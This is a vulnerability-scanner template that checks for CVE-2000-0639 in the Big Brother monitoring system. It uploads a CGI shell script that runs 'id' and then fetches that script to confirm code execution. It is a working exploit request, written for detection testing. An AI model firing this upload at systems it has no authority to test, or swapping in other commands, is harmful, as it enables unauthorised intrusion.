[info]
author = "ave"
description = "Big Brother 监控系统 1.4h2 及更早版本 bbd 组件 CGI 文件上传漏洞检测，通过 HTTP 上传 .cgi 文件验证未授权文件创建缺陷"
id = "POC-AVE-2000-0491"
name = "CVE-2000-0639 PoC"
severity = "high"
tags = ["ave-2000-0491"]
vuln_id = [
    "CVE-2000-0639",
    "AVE-2000-0491",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/bbd"
protocol = "http"

[poc.requests.body]
content = "filename=test.cgi&data=#!/bin/sh%0Aecho%20Content-Type:%20text/plain%0Aecho%0Aid"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "OK",
    "uploaded",
    "created",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/bbd/test.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
